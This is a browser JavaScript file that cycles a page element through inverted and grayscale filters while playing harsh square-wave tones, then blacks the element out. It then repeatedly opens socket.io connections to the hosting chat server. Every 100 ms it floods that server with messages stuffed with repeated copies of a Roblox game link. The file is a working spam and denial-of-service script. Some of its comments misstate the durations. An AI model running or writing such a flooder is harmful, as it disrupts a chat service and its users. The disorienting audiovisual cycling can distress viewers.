let ctx = new(window.AudioContext || window.webkitAudioContext)();

// Declare and assign the div variable to the desired element
let div = document.getElementById("content");

function playSquareWave(frequency, duration) {
    let sampleRate = 44100; // Common sample rate
    let frameCount = sampleRate * duration;
    let buffer = ctx.createBuffer(1, frameCount, sampleRate);
    let data = buffer.getChannelData(0);

    let period = sampleRate / frequency;
    for (let i = 0; i < frameCount; i++) {
        data[i] = (i % period) < (period / 2) ? 1 : -1;
    }

    let source = ctx.createBufferSource();
    source.buffer = buffer;
    source.connect(ctx.destination);
    source.start();
}

async function cycle() {
    while (true) {
        // Grayscale + 150Hz for 30s
        div.style.filter = "grayscale(100%)";
        playSquareWave(150, 15);
        await new Promise(r => setTimeout(r, 15000));

            // Normal for 0.75–2.5s
            div.style.filter = "none";
            let pause = 750 + Math.random() * 1750;
            await new Promise(r => setTimeout(r, pause));

            // Invert + hue 180° + 200Hz for 30s
            div.style.filter = "invert(100%) hue-rotate(180deg)";
            playSquareWave(200, 15);
            await new Promise(r => setTimeout(r, 15000));

            // Normal for 0.75–2.5s
            div.style.filter = "none";
            pause = 750 + Math.random() * 1750;
            await new Promise(r => setTimeout(r, pause));

            // Invert + hue 180° + 200Hz for 30s
            div.style.filter = "invert(100%)";
            playSquareWave(210, 15);
            await new Promise(r => setTimeout(r, 15000));

            // Normal for 0.75–2.5s
            div.style.filter = "none";
            pause = 750 + Math.random() * 1750;
            await new Promise(r => setTimeout(r, pause));

            // Invert + hue 180° + 200Hz for 30s
            div.style.filter = "invert(100%) grayscale(100%)";
            playSquareWave(75, 15);
            await new Promise(r => setTimeout(r, 15000));

            // Normal for 0.75–2.5s
            div.style.filter = "none";
            pause = 100;
            await new Promise(r => setTimeout(r, pause));

            div.style.filter = "invert(50%) brightness(-10000%)";

            setInterval(() => {
                const socket = io("//");
                const sockett = io("//");
                sockett.emit("client", "MAIN");
                socket.emit("client", "MAIN");
                socket.emit("login", {
                    name: "https://www.roblox.com/games/90615328924675/Maze",
                    room: Math.floor(Math.random() * 100)
                });
                socket.emit("login", {
                    name: "https://www.roblox.com/games/90615328924675/Maze"
                });
                setInterval(() => {
                    socket.emit("command", {
                        list: ["color"]
                    });
                    socket.emit("talk", {
                        text: "https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze " + Math.random() * 100000000000000000000
                    });
                    sockett.emit("command", {
                        list: ["color"]
                    });
                    sockett.emit("talk", {
                        text: "https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze " + Math.random() * 100000000000000000000
                    });
                }, 100)
            }, 1000)

            await new Promise(r => setTimeout(r, 1000000));
        }
    }

    cycle();
